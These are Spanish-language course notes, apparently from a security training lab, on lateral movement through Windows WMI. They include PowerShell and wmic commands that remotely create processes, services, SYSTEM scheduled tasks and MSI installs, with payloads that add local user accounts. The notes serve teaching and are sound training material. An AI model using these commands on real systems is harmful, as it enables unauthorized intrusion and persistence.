---
layout: apunte
title: "3. Moving Laterally Using WMI"
---

También podemos realizar varias técnicas vistas en la tarea anterior de forma diferente usando Windows Management Instrumentation (WMI). WMI es la implementación de Windows de Web-Based Enterprise Management (WBEM).

WMI permite a los administradores realizar tareas de gestión estándar que los atacantes pueden abusar para realizar movimiento lateral de varias formas.

----------------------------
<h2>Conectarse a WMI desde PowerShell</h2>
Antes de ser capaz de conectarse a WMI usando comandos de PowerShell, necesitamos crear un objeto PSCredential con nuestro usuario y contraseña. Este objeto estará almacenado en la variable `$credential` y será utilizada a lo largo de las técnicas de esta tarea:

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Luego procedemos a establecer la sesión WMI usando alguno de los siguientes protocolos:

- **DCOM:** RPC over IP será usado para conectarse a WMI. Este protocolo usa el puerto 135/TCP y puertos 49152-65535/TCP como se explicó en sc.exe.
- **Wsman:** WinRM será usado para conectarse a WMI. Este protocolo usa puertos 5985/TCP (WinRM HTTP) o 5986/TCP (WinRM HTTPS).

Para establecer una sesión WMI desde Powershell, podemos usar los siguientes comandos y almacenar la sesión en la variable `$Session`, lo que será usado a lo largo de la tarea en diferentes técnicas:

```powershell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

El cmdlet `New-CimSessionOption` es usado para configurar las opciones de conexión para la sesión WMI, incluyendo el protocolo de conexión. Las opciones y credenciales son pasadas al cmdlet `New-CimSession` para establecer una sesión contra un host remoto.

-------------------------------
<h2>Creación Remota de Procesos usando WMI</h2>
- **Puertos:** 
	- 135/tcp, 49152-65535/TCP (DCERPC)
	- 5985/TCP (WinRM HTTP) o 5986/TCP (WinRM HTTPS)
- **Membresías de Grupo Requeridas:** Administrators

Podemos spawnear remotamente un proceso desde Powershell usando WMI, mandando una petición WMI a la clase `Win32_Process` para spawnear el proceso bajo la sesión que creamos antes:

```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value xutwashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

>[!NOTE] Ten en cuenta que WMI no te permitirá ver el output de ningún comando pero lo ejecutará silenciosamente.

En sistemas legacy, se puede hacer lo mismo usando `wmic` desde el command prompt:

```cmd
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"
```

-------------------------------------
<h2>Crear Servicios de Forma Remota con WMI</h2>
- **Puertos:** 
	- 135/TCP, 49152-65535/TCP (DCERPC)
	- 5985/TCP (WinRM HTTP) o 5986/TCP (WinRM HTTPS)
- **Membresías de Grupo Requeridas:** Administrators

Podemos crear servicios remotamente con WMI a través de Powershell. Para crear un servicio llamado THMService2, podemos usar el siguiente comando:

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user xut2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```

Y luego, podemos arrancar el servicio con los siguientes comandos:

```powershell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```

Finalmente, podemos parar y eliminar el servicio con los siguientes comandos:

```powershell
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

--------------------------------
<h2>Crear Tareas Programadas Remotamente con WMI</h2>
- **Puertos:** 
	- 135/TCP, 49152-65535/TCP (DCERPC)
	- 5985 (WinRM HTTP) o 5986 (WinRM HTTPS)
- **Membresías de Grupo Requeridas:** Administrators

Podemos crear y ejecutar tareas programadas usando alguno de los cmdlets disponibles en las instalaciones Windows por defecto:

```powershell
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user xut22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

Para eliminar esta tarea programada después de haber sido utilizada, podemos usar el siguiente comando:

```powershell
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

-------------------------------------
<h2>Instalar Paquetes MSI a través de WMI</h2>
- **Puertos:** 
	- 135/TCP, 49152-65535/TCP (DCERPC)
	- 5985/TCP (WinRM HTTP) o 5986/TCP (WinRM HTTPS)
- **Membresías de Grupo Requeridas:** Administrators

MSI es un formato de archivo usado por instaladores. Si podemos copiar un paquete MSI al sistema objetivo, podemos usar WMI para intentar instalarlo. El archivo puede ser copiado de cualquier manera disponible para el atacante. Una vez que el archivo MSI está en el sistema objetivo, podemos intentar instalarlo invocando la clase `Win32_Process` a través de WMI:

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

Podemos conseguir lo mismo usando `wmic` en sistemas legacy:

```powershell
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```

